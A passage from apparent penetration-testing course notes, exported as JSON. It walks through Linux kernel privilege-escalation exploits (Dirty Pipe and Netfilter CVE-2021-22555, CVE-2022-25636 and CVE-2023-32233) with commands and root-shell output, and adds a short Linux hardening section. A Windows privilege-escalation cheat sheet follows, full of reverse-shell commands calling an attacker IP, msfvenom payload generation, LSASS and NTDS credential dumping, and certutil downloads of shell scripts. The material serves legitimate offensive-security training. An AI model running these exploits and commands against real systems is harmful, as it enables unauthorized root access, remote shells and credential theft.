now)\n\nid\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nWith the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:\n\n#### Find SUID Binaries\n\nDirty Pipe\n\n```shell-session\ncry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null\n\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/xorg/Xorg.wrap\n/usr/sbin/pppd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/fusermount\n/usr/bin/sudo\n/usr/bin/vmware-user-suid-wrapper\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/pkexec\n/usr/bin/newgrp\n```\n\nThen we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.\n\n#### Exploitation\n\nDirty Pipe\n\n```shell-session\ncry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo\n\n[+] hijacking suid binary..\n[+] dropping suid shell..\n[+] restoring suid binary..\n[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n\n# id\n\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/26-Netfilter",
    "path": "02_CPTS/16-Linux Privilege Escalation/26-Netfilter.md",
    "title": "26 Netfilter",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Netfilter is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffi...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.\n\nThis kernel module has three main functions:\n\n1. Packet defragmentation\n2. Connection tracking\n3. Network address translation (NAT)\n\nWhen the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.\n\nMany companies have preconfigured Linux distributions adapted to their software applications or vice versa. This gives the developers and administrators, metaphorically speaking, a \"dynamic basis\" that is difficult to replace. This would require either adapting the system to the software application or adapting the application to the newer system. Depending on the size and complexity of the application, this can take a great deal of time and effort. This is often why so many companies run older and not updated Linux distributions in production.\n\nEven if the company uses virtual machines or containers like Docker, these are built on a specific kernel. The idea of isolating the software application from the existing host system is a good step, but there are many ways to break out of such a container.\n\n#### CVE-2021-22555\n\nVulnerable kernel versions: 2.6 - 5.11\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~$ uname -r\n\n5.10.5-051005-generic\n```\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ncry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit\ncry0l1t3@ubuntu:~$ ./exploit\n\n[+] Linux Privilege Escalation by theflow@ - 2021\n\n[+] STAGE 0: Initialization\n[*] Setting up namespace sandbox...\n[*] Initializing sockets and message queues...\n\n[+] STAGE 1: Memory corruption\n[*] Spraying primary messages...\n[*] Spraying secondary messages...\n[*] Creating holes in primary messages...\n[*] Triggering out-of-bounds write...\n[*] Searching for corrupted primary message...\n[+] fake_idx: fff\n[+] real_idx: fdf\n\n...SNIP...\n\nroot@ubuntu:/home/cry0l1t3# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n#### CVE-2022-25636\n\nA recent vulnerability is [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~$ uname -r\n\n5.13.0-051300-generic\n```\n\nHowever, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git\ncry0l1t3@ubuntu:~$ cd CVE-2022-25636\ncry0l1t3@ubuntu:~$ make\ncry0l1t3@ubuntu:~$ ./exploit\n\n[*] STEP 1: Leak child and parent net_device\n[+] parent net_device ptr: 0xffff991285dc0000\n[+] child  net_device ptr: 0xffff99128e5a9000\n\n[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device\n[+] net_device struct freed\n\n[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device\n[+] obtained net_device struct\n\n[*] STEP 4: Leak kaslr\n[*] kaslr leak: 0xffffffff823093c0\n[*] kaslr base: 0xffffffff80ffefa0\n\n[*] STEP 5: Release setxattrs, free net_device, and realloc it again\n[+] obtained net_device struct\n\n[*] STEP 6: rop :)\n\n# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n#### CVE-2023-32233\n\nThis vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.\n\nThe exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.\n\n#### Proof-Of-Concept\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233\ncry0l1t3@ubuntu:~$ cd CVE-2023-32233\ncry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl\n```\n\n#### Exploitation\n\nNetfilter\n\n```shell-session\ncry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit\n\n[*] Netfilter UAF exploit\n\nUsing profile:\n========\n1                   race_set_slab                   # {0,1}\n1572                race_set_elem_count             # k\n4000                initial_sleep                   # ms\n100                 race_lead_sleep                 # ms\n600                 race_lag_sleep                  # ms\n100                 reuse_sleep                     # ms\n39d240              free_percpu                     # hex\n2a8b900             modprobe_path                   # hex\n23700               nft_counter_destroy             # hex\n347a0               nft_counter_ops                 # hex\na                   nft_counter_destroy_call_offset # hex\nffffffff            nft_counter_destroy_call_mask   # hex\ne8e58948            nft_counter_destroy_call_check  # hex\n========\n\n[*] Checking for available CPUs...\n[*] sched_getaffinity() => 0 2\n[*] Reserved CPU 0 for PWN Worker\n[*] Started cpu_spinning_loop() on CPU 1\n[*] Started cpu_spinning_loop() on CPU 2\n[*] Started cpu_spinning_loop() on CPU 3\n[*] Creating \"/tmp/modprobe\"...\n[*] Creating \"/tmp/trigger\"...\n[*] Updating setgroups...\n[*] Updating uid_map...\n[*] Updating gid_map...\n[*] Signaling PWN Worker...\n[*] Waiting for PWN Worker...\n\n...SNIP...\n\n[*] You've Got ROOT:-)\n\n# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nPlease keep in mind that these exploits can be very unstable and can break the system.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/27-Linux Hardening",
    "path": "02_CPTS/16-Linux Privilege Escalation/27-Linux Hardening.md",
    "title": "27 Linux Hardening",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Proper Linux hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attack being able t...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nProper Linux hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attack being able to elevate to root-level access:\n\n---\n\n## Updates and Patching\n\nMany quick and easy privilege escalation exploits exist for out-of-date Linux kernels and known vulnerable versions of built-in and third-party services. Performing periodic updates will remove some of the most \"low hanging fruit\" that can be leveraged to escalate privileges. On Ubuntu, the package [unattended-upgrades](https://packages.ubuntu.com/jammy/admin/unattended-upgrades) is installed by default from 18.04 onwards and can be manually installed on Ubuntu dating back to at least 10.04 (Lucid). Debian based operating systems going back to before Jessie also have this package available. On Red Hat based systems, the [yum-cron](https://man7.org/linux/man-pages/man8/yum-cron.8.html) package performs a similar task.\n\n---\n\n## Configuration Management\n\nThis is by no means an exhaustive list, but some simple hardening measures are to:\n\n- Audit writable files and directories and any binaries set with the SUID bit.\n- Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.\n- Do not store credentials in cleartext in world-readable files.\n- Clean up home directories and bash history.\n- Ensure that low-privileged users cannot modify any custom libraries called by programs.\n- Remove any unnecessary packages and services that potentially increase the attack surface.\n- Consider implementing [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux), which provides additional access controls on the system.\n\n---\n\n## User Management\n\nWe should limit the number of user accounts and admin accounts on each system, ensure that logon attempts (valid/invalid) are logged and monitored. It is also a good idea to enforce a strong password policy, rotate passwords periodically, and restrict users from reusing old passwords by using the /etc/security/opasswd file with the PAM module. We should check that users are not placed into groups that give them excessive rights not needed for their day-to-day tasks and limit sudo rights based on the principle of least privilege.\n\nTemplates exist for configuration management automation tools such as [Puppet](https://puppet.com/use-cases/configuration-management/), [SaltStack](https://github.com/saltstack/salt), [Zabbix](https://en.wikipedia.org/wiki/Zabbix) and [Nagios](https://en.wikipedia.org/wiki/Nagios) to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods. Remote actions (Zabbix) and Remediation Actions (Nagios) can be used to find and auto correct these issues over a fleet of nodes. Tools such as Zabbix also feature functions such as checksum verification, which can be used for both version control and to confirm sensitive binaries have not been tampered with. For example, via the [vfs.file.cksum](https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix_agent) file.\n\n---\n\n## Audit\n\nPerform periodic security and configuration checks of all systems. There are several security baselines such as the DISA [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/) that can be followed to set a standard for security across all operating system types and devices. Many compliance frameworks exist, such as [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), and [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html) which can be used by an organization to help establish security baselines. These should all be used as reference guides and not the basis for a security program. A strong security program should have controls tailored to the organization's needs, operating environment, and the types of data that they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).\n\nAn audit and configuration review is not a replacement for a penetration test or other types of technical, hands-on assessments and is often seen as a \"box-checking\" exercise in which an organization is \"passed\" on a controls audit for performing the bare minimum. These reviews can help supplement regular vulnerability scanning and penetration testing and strong patch, vulnerability, and configuration management programs.\n\nOne useful tool for auditing Unix-based systems (Linux, macOS, BDS, etc.) is [Lynis](https://github.com/CISOfy/lynis). This tool audits the current configuration of a system and provides additional hardening tips, taking into consideration various standards. It can be used by internal teams such as system administrators as well as third-parties (auditors and penetration testers) to obtain a \"baseline\" of the system's current security configuration. Again, this tool or others like it should not replace the manual techniques discussed in this module but can be a strong supplement to cover areas that may be overlooked.\n\nAfter cloning the entire repo, we can run the tool by typing `./lynis audit system` and receive a full report.\n\nLinux Hardening\n\n```shell-session\nhtb_student@NIX02:~$ ./lynis audit system\n\n[ Lynis 3.0.1 ]\n\n################################################################################\n  Lynis comes with ABSOLUTELY NO WARRANTY. This is free software, and you are\n  welcome to redistribute it under the terms of the GNU General Public License.\n  See the LICENSE file for details about using this software.\n\n  2007-2020, CISOfy - https://cisofy.com/lynis/\n  Enterprise support available (compliance, plugins, interface and tools)\n################################################################################\n\n\n[+] Initializing program\n------------------------------------\n\n  ###################################################################\n  #                                                                 #\n  #   NON-PRIVILEGED SCAN MODE                                      #\n  #                                                                 #\n  ###################################################################\n\n  NOTES:\n  --------------\n  * Some tests will be skipped (as they require root permissions)\n  * Some tests might fail silently or give different results\n\n  - Detecting OS...                                           [ DONE ]\n  - Checking profiles...                                      [ DONE ]\n\n  ---------------------------------------------------\n  Program version:           3.0.1\n  Operating system:          Linux\n  Operating system name:     Ubuntu\n  Operating system version:  16.04\n  Kernel version:            4.4.0\n  Hardware platform:         x86_64\n  Hostname:                  NIX02\n```\n\nThe resulting scan will be broken down into warnings:\n\nLinux Hardening\n\n```shell-session\nWarnings (2):\n  ----------------------------\n  ! Found one or more cronjob files with incorrect file permissions (see log for details) [SCHD-7704] \n      https://cisofy.com/lynis/controls/SCHD-7704/\n\n  ! systemd-timesyncd never successfully synchronized time [TIME-3185] \n      https://cisofy.com/lynis/controls/TIME-3185/\n```\n\nSuggestions:\n\nLinux Hardening\n\n```shell-session\nSuggestions (53):\n  ----------------------------\n  * Set a password on GRUB boot loader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122] \n      https://cisofy.com/lynis/controls/BOOT-5122/\n\n  * If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] \n      https://cisofy.com/lynis/controls/KRNL-5820/\n\n  * Run pwck manually and correct any errors in the password file [AUTH-9228] \n      https://cisofy.com/lynis/controls/AUTH-9228/\n\n  * Configure minimum encryption algorithm rounds in /etc/login.defs [AUTH-9230] \n      https://cisofy.com/lynis/controls/AUTH-9230/\n```\n\nand an overal scan details section:\n\nLinux Hardening\n\n```shell-session\nLynis security scan details:\n\n  Hardening index : 60 [############        ]\n  Tests performed : 256\n  Plugins enabled : 2\n\n  Components:\n  - Firewall               [X]\n  - Malware scanner        [X]\n\n  Scan mode:\n  Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)\n\n  Lynis modules:\n  - Compliance status      [?]\n  - Security audit         [V]\n  - Vulnerability scan     [V]\n\n  Files:\n  - Test and debug information      : /home/mrb3n/lynis.log\n  - Report data                     : /home/mrb3n/lynis-report.dat\n```\n\nThe tool is useful for informing privilege escalation paths and performing a quick configuration check and will perform even more checks if run as the root user.\n\n---\n\n## Conclusion\n\nAs we have seen, there are various ways to escalate privileges on Linux/Unix systems - from simple misconfigurations and public exploits for known vulnerable services to exploit development based on custom libraries. Once root access is obtained, it becomes easier to use it as a pivot point for further network exploitation. Linux (and all system) hardening is critical for organizations of all sizes. Best practice guidelines and controls exist in many different forms. Reviews should include a mix of hands-on manual testing and review and automated configuration scanning and validation of the results.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/00-Cheet Sheet Windows Privilege Escalation",
    "path": "02_CPTS/17-Windows Privilege Escalation/00-Cheet Sheet Windows Privilege Escalation.md",
    "title": "00 Cheet Sheet Windows Privilege Escalation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Initial Enumeration | Command                                                                                           | Description                                | | -------------------------------...",
    "category": "02_CPTS",
    "content": "## Initial Enumeration\n\n| **Command**                                                                                           | **Description**                                |\n| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------- |\n| `xfreerdp /v:<target ip> /u:htb-student`                                                              | RDP to lab target                              |\n| `ipconfig /all`                                                                                       | Get interface, IP address and DNS information  |\n| `arp -a`                                                                                              | Review ARP table                               |\n| `route print`                                                                                         | Review routing table                           |\n| `Get-MpComputerStatus`                                                                                | Check Windows Defender status                  |\n| `Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections`                            | List AppLocker rules                           |\n| `Get-AppLockerPolicy -Local \\| Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone` | Test AppLocker policy                          |\n| `set`                                                                                                 | Display all environment variables              |\n| `systeminfo`                                                                                          | View detailed system configuration information |\n| `wmic qfe`                                                                                            | Get patches and updates                        |\n| `wmic product get name`                                                                               | Get installed programs                         |\n| `tasklist /svc`                                                                                       | Display running processes                      |\n| `query user`                                                                                          | Get logged-in users                            |\n| `echo %USERNAME%`                                                                                     | Get current user                               |\n| `whoami /priv`                                                                                        | View current user privileges                   |\n| `whoami /groups`                                                                                      | View current user group information            |\n| `net user`                                                                                            | Get all system users                           |\n| `net localgroup`                                                                                      | Get all system groups                          |\n| `net localgroup administrators`                                                                       | View details about a group                     |\n| `net accounts`                                                                                        | Get passsword policy                           |\n| `netstat -ano`                                                                                        | Display active network connections             |\n| `pipelist.exe /accepteula`                                                                            | List named pipes                               |\n| `gci \\\\.\\pipe\\`                                                                                       | List named pipes with PowerShell               |\n| `accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v`                                                         | Review permissions on a named pipe             |\n\n## Handy Commands\n\n| **Command**                                                                                                                                                                           | **Description**                                            |\n| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |\n| `mssqlclient.py sql_dev@10.129.43.30 -windows-auth`                                                                                                                                   | Connect using mssqlclient.py                               |\n| `enable_xp_cmdshell`                                                                                                                                                                  | Enable xp_cmdshell with mssqlclient.py                     |\n| `xp_cmdshell whoami`                                                                                                                                                                  | Run OS commands with xp_cmdshell                           |\n| `c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\" -t *`                                                             | Escalate privileges with JuicyPotato                       |\n| `c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"`                                                                                                               | Escalating privileges with PrintSpoofer                    |\n| `procdump.exe -accepteula -ma lsass.exe lsass.dmp`                                                                                                                                    | Take memory dump with ProcDump                             |\n| `sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords`                                                                                                                         | Use MimiKatz to extract credentials from LSASS memory dump |\n| `dir /q C:\\backups\\wwwroot\\web.config`                                                                                                                                                | Checking ownership of a file                               |\n| `takeown /f C:\\backups\\wwwroot\\web.config`                                                                                                                                            | Taking ownership of a file                                 |\n| `Get-ChildItem -Path ‘C:\\backups\\wwwroot\\web.config’ \\| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`                                             | Confirming changed ownership of a file                     |\n| `icacls “C:\\backups\\wwwroot\\web.config” /grant htb-student:F`                                                                                                                         | Modifying a file ACL                                       |\n| `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`                                                                                                            | Extract hashes with secretsdump.py                         |\n| `robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit`                                                                                                                                         | Copy files with ROBOCOPY                                   |\n| `wevtutil qe Security /rd:true /f:text \\| Select-String \"/user\"`                                                                                                                      | Searching security event logs                              |\n| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \\| findstr \"/user\"`                                                                                       | Passing credentials to wevtutil                            |\n| `Get-WinEvent -LogName security \\| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \\| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | Searching event logs with PowerShell                       |\n| `msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll`                                                                              | Generate malicious DLL                                     |\n| `dnscmd.exe /config /serverlevelplugindll adduser.dll`                                                                                                                                | Loading a custom DLL with dnscmd                           |\n| `wmic useraccount where name=\"netadm\" get sid`                                                                                                                                        | Finding a user's SID                                       |\n| `sc.exe sdshow DNS`                                                                                                                                                                   | Checking permissions on DNS service                        |\n| `sc stop dns`                                                                                                                                                                         | Stopping a service                                         |\n| `sc start dns`                                                                                                                                                                        | Starting a service                                         |\n| `reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters`                                                                                                       | Querying a registry key                                    |\n| `reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll`                                                                              | Deleting a registry key                                    |\n| `sc query dns`                                                                                                                                                                        | Checking a service status                                  |\n| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`                                                                                             | Disabling the global query block list                      |\n| `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`                                                | Adding a WPAD record                                       |\n| `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`                                                                                                                             | Compile with cl.exe                                        |\n| `reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"`                                                                                    | Add reference to a driver (1)                              |\n| `reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1`                                                                                                              | Add reference to a driver (2)                              |\n| `.\\DriverView.exe /stext drivers.txt` and `cat drivers.txt \\| Select-String -pattern Capcom`                                                                                          | Check if driver is loaded                                  |\n| `EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys`                                                                                                               | Using EopLoadDriver                                        |\n| `c:\\Tools\\PsService.exe security AppReadiness`                                                                                                                                        | Checking service permissions with PsService                |\n| `sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"`                                                                                              | Modifying a service binary path                            |\n| `REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA`                                                                                | Confirming UAC is enabled                                  |\n| `REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin`                                                               | Checking UAC level                                         |\n| `[environment]::OSVersion.Version`                                                                                                                                                    | Checking Windows version                                   |\n| `cmd /c echo %PATH%`                                                                                                                                                                  | Reviewing path variable                                    |\n| `curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\"`                                                                           | Downloading file with cURL in PowerShell                   |\n| `rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll`                                                                                   | Executing custom dll with rundll32.exe                     |\n| `.\\SharpUp.exe audit`                                                                                                                                                                 | Running SharpUp                                            |\n| `icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"`                                                                                                                       | Checking service permissions with icacls                   |\n| `cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"`                                                                                           | Replace a service binary                                   |\n| `wmic service get name,displayname,pathname,startmode \\| findstr /i \"auto\" \\| findstr /i /v \"c:\\windows\\\\\" \\| findstr /i /v \"\"\"`                                                      | Searching for unquoted service paths                       |\n| `accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services`                                                                                                    | Checking for weak service ACLs in the Registry             |\n| `Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"`            | Changing ImagePath with PowerShell                         |\n| `Get-CimInstance Win32_StartupCommand \\| select Name, command, Location, User \\| fl`                                                                                                  | Check startup programs                                     |\n| `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`                                                                       | Generating a malicious binary                              |\n| `get-process -Id 3324`                                                                                                                                                                | Enumerating a process ID with PowerShell                   |\n| `get-service \\| ? {$_.DisplayName -like 'Druva*'}`                                                                                                                                    | Enumerate a running service by name with PowerShell        |\n\n## Credential Theft\n\n|**Command**|**Description**|\n|---|---|\n|`findstr /SIM /C:\"password\" *.txt *ini *.cfg *.config *.xml`|Search for files with the phrase \"password\"|\n|`gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' \\| Select-String password`|Searching for passwords in Chrome dictionary files|\n|`(Get-PSReadLineOption).HistorySavePath`|Confirm PowerShell history save path|\n|`gc (Get-PSReadLineOption).HistorySavePath`|Reading PowerShell history file|\n|`$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'`|Decrypting PowerShell credentials|\n|`cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt`|Searching file contents for a string|\n|`findstr /si password *.xml *.ini *.txt *.config`|Searching file contents for a string|\n|`findstr /spin \"password\" *.*`|Searching file contents for a string|\n|`select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password`|Search file contents with PowerShell|\n|`dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`|Search for file extensions|\n|`where /R C:\\ *.config`|Search for file extensions|\n|`Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`|Search for file extensions using PowerShell|\n|`cmdkey /list`|List saved credentials|\n|`.\\SharpChrome.exe logins /unprotect`|Retrieve saved Chrome credentials|\n|`.\\lazagne.exe -h`|View LaZagne help menu|\n|`.\\lazagne.exe all`|Run all LaZagne modules|\n|`Invoke-SessionGopher -Target WINLPE-SRV01`|Running SessionGopher|\n|`netsh wlan show profile`|View saved wireless networks|\n|`netsh wlan show profile ilfreight_corp key=clear`|Retrieve saved wireless passwords|\n\n## Other Commands\n\n|**Command**|**Description**|\n|---|---|\n|`certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`|Transfer file with certutil|\n|`certutil -encode file1 encodedfile`|Encode file with certutil|\n|`certutil -decode encodedfile file2`|Decode file with certutil|\n|`reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer`|Query for always install elevated registry key (1)|\n|`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer`|Query for always install elevated registry key (2)|\n|`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`|Generate a malicious MSI package|\n|`msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart`|Executing an MSI package from command line|\n|`schtasks /query /fo LIST /v`|Enumerate scheduled tasks|\n|`Get-ScheduledTask \\| select TaskName,State`|Enumerate scheduled tasks with PowerShell|\n|`.\\accesschk64.exe /accepteula -s -d C:\\Scripts\\`|Check permissions on a directory|\n|`Get-LocalUser`|Check local user description field|\n|`Get-WmiObject -Class Win32_OperatingSystem \\| select Description`|Enumerate computer description field|\n|`guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`|Mount VMDK on Linux|\n|`guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`|Mount VHD/VHDX on Linux|\n|`sudo python2.7 windows-exploit-suggester.py --update`|Update Windows Exploit Suggester database|\n|`python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt`|Running Windows Exploit Suggester|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/01-Introduction to Windows Privilege Escalation",
    "path": "02_CPTS/17-Windows Privilege Escalation/01-Introduction to Windows Privilege Escalation.md",
    "title": "01 Introduction To Windows Privilege Escalation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Introduction to Windows Privilege Escalation --- After gaining a foothold, elevating our privileges will provide more options for persistence and may reveal information stored locally that can further...",
    "category": "02_CPTS",
    "content": "# Introduction to Windows Privilege Escalation\n\n---\n\nAfter gaining a foothold, elevating our privileges will provide more options for persistence and may reveal information stored locally that can further our access within the environment. The general goal of Windows privilege escalation is to further our access to a given system to a member of the `Local Administrators` group or the `NT AUTHORITY\\SYSTEM` [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account. There may, however, be scenarios where escalating to another user on the system may be enough to reach our goal. Privilege escalation is typically a vital step during any engagement. We need to use the access obtained, or some data (such as credentials) found only once we have a session in an elevated context. In some cases, privilege escalation may be the ultimate goal of the assessment if our client hires us for a \"gold image\" or \"workstation breakout\" type assessment. Privilege escalation is often vital to continue through a network towards our ultimate objective, as well as for lateral movement.\n\nThat being said, we may need to escalate privileges for one of the following reasons:\n\n|||\n|---|---|\n|1.|When testing a client's [gold image](https://www.techopedia.com/definition/29456/golden-image) Windows workstation and server build for flaws|\n|2.|To escalate privileges locally to gain access to some local resource such as a database|\n|3.|To gain [NT AUTHORITY\\System](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) level access on a domain-joined machine to gain a foothold into the client's Active Directory environment|\n|4.|To obtain credentials to move laterally or escalate privileges within the client's network|\n\nThere are many tools available to us as penetration testers to assist with privilege escalation. Still, it is also essential to understand how to perform privilege escalation checks and leverage flaws `manually` to the extent possible in a given scenario. We may run into situations where a client places us on a managed workstation with no internet access, heavily firewalled, and USB ports disabled, so we cannot load any tools/helper scripts. In this instance, it would be crucial to have a firm grasp of Windows privilege escalation checks using both PowerShell and Windows command-line.\n\nWindows systems present a vast attack surface. Just some of the ways that we can escalate privileges are:\n\n|||\n|---|---|\n|Abusing Windows group 